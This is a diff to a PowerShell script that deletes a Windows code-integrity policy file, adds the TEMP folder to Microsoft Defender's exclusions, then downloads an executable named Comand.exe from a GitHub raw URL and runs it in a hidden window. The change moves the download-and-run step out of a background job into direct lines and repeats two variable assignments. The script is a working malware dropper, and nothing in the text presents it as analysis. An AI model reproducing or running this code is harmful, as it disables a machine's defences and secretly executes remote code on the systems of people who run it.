@@ -32,12 +32,12 @@ Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse
 $path = Get-Item $env:TEMP
 $folder = $path.FullName
 
+$path = Get-Item $env:TEMP
+$folder = $path.FullName
+
 try {
     Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
 } catch {}
 
-Start-Job -ScriptBlock {
-    param($f)
-    Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$f\Comand.exe" -ErrorAction SilentlyContinue
-    Start-Process -FilePath "$f\Comand.exe" -WindowStyle Hidden
-} -ArgumentList $folder | Out-Null
+Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$folder\Comand.exe" -ErrorAction SilentlyContinue
+Start-Process -FilePath "$folder\Comand.exe" -WindowStyle Hidden
